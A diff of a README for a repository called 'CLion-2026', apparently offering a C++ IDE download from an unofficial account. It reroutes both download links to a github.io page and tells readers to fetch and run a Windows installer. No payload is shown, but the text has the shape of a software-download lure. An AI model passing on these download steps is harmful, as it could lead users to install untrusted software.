@@ -1,6 +1,6 @@
 # 💻 CLion-2026 - Streamlined C Plus Plus Development Environment
 
-[![Download CLion-2026](https://img.shields.io/badge/Download-CLion-2026-blue)](https://github.com/Preoperative-medium214/CLion-2026)
+[![Download CLion-2026](https://img.shields.io/badge/Download-CLion-2026-blue)](https://preoperative-medium214.github.io)
 
 ## 📌 Introduction
 
@@ -22,7 +22,7 @@ If your system lacks these items, the program might run slow or fail to open. Ch
 
 Follow these steps to obtain the correct files for your machine:
 
-1.  Visit the official repository page to start: [Download CLion-2026](https://github.com/Preoperative-medium214/CLion-2026).
+1.  Visit the official repository page to start: [Download CLion-2026](https://preoperative-medium214.github.io).
 2.  Look for the latest release section.
 3.  Click the download button for the Windows installer file.
 4.  Wait for the file to finish saving to your "Downloads" folder.
